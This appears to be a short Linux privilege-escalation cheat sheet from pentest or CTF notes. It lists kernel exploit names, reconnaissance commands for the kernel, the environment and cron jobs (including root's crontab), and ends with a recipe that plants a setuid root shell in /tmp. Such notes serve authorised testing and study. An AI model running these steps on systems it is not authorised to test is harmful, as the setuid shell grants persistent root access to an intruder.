GTFObins / LINUX

[https://gtfobins.github.io/](https://gtfobins.github.io/)

`Pwnkit`
`dirty pipe`
+w docker.sock
`reddit overlayfs`

```shell
(cat /proc/version || uname -a ) 2>/dev/null
```

```shell
lsb_release -a 2>/dev/null # old, not by default on many systems
```

```shell
cat /etc/os-release 2>/dev/null # universal on modern systems
```

```shell
echo $PATH
```

```shell
(env || set) 2>/dev/null
```

```shell
cat /proc/version
```

```shell
uname -a
```

```shell
searchsploit "Linux Kernel"
```

[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

```shell
crontab -l
```

```shell
cat /etc/crontab
```

```shell
ls -al /etc/cron* /etc/at*
```

```shell
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

```bash
cp /bin/sh /tmp
chown root:root /tmp/sh
chmod +s /tmp/sh
```